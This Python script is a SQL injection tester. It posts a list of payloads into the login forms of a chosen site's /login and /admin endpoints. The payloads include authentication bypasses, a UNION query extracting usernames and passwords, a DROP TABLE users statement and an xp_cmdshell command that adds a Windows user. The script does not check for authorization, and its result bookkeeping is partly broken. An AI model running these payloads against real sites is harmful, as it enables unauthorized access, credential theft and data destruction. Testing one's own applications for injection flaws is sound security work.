import requests
from urllib.parse import urljoin
import logging

class SQLInjectionTester:
    def __init__(self, base_url: str, endpoints: list[str] = None, timeout: float = 5.0):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.timeout = timeout
        self.endpoints = endpoints or ['/']
        self.results = {}  # Dictionary to store the results

    def _post(self, path: str, data: dict):
        url = urljoin(self.base_url, path)
        resp = self.session.post(url, data=data, timeout=self.timeout)
        resp.raise_for_status()
        return resp

    def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities."""
        payloads = [
            "' OR 1=1 --",  # Classic SQL Injection
            "' OR 'a'='a",  # Another form of classic SQL Injection
            "' UNION SELECT NULL, username, password FROM users --",  # Union-based Injection
            "'; DROP TABLE users --",  # Dangerous query (for destructive testing)
            "admin'--",  # Comment-based SQL injection
            "' OR '1'='1' -- ",  # Always true condition
            "'; --",  # Comment with semicolon
            "'; EXEC xp_cmdshell('net user test testpass /add') --",  # Command execution via SQL Injection
        ]

        vuln_found = False
        for path in self.endpoints:
            for payload in payloads:
                # Try each payload in the form data
                data = {'username': payload, 'password': 'any'}  # Assuming login form with username/password
                try:
                    response = self._post(path, data)
                    if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                        logging.warning(f"SQL Injection vulnerability detected on {path} with payload: {payload}")
                        vuln_found = True
                        self.results[path] = (payload, response.text)  # Store result in dictionary
                        return True, payload
                except requests.exceptions.RequestException as e:
                    logging.error(f"Error testing {path} with payload {payload}: {e}")
                    continue
        self.results[path] = (None, None)  # If no vulnerabilities found for this endpoint
        return False, None

    def print_results(self):
        """Print the test results in a formatted manner."""
        for name, (vuln, info) in self.results.items():
            # Format the output to match your desired style
            vuln_str = "None" if vuln is None else vuln  # Show "None" if no vulnerability
            info_str = info if info is not None else "None"  # If no info, display "None"
            
            # Print formatted result
            line = f"{name:25s} → vulnerability:{vuln_str}"
            line += f"  info={info_str}"  # Append info or "None" if no info is available
            print(line)

if __name__ == "__main__":
    base_url = "http://example.com"  # Replace with the actual URL of the site you want to test
    tester = SQLInjectionTester(base_url, endpoints=["/login", "/admin"])  # List your endpoints here
    
    # Test for SQL Injection
    tester.test_sql_injection()
    
    # Print the results of the tests
    tester.print_results()
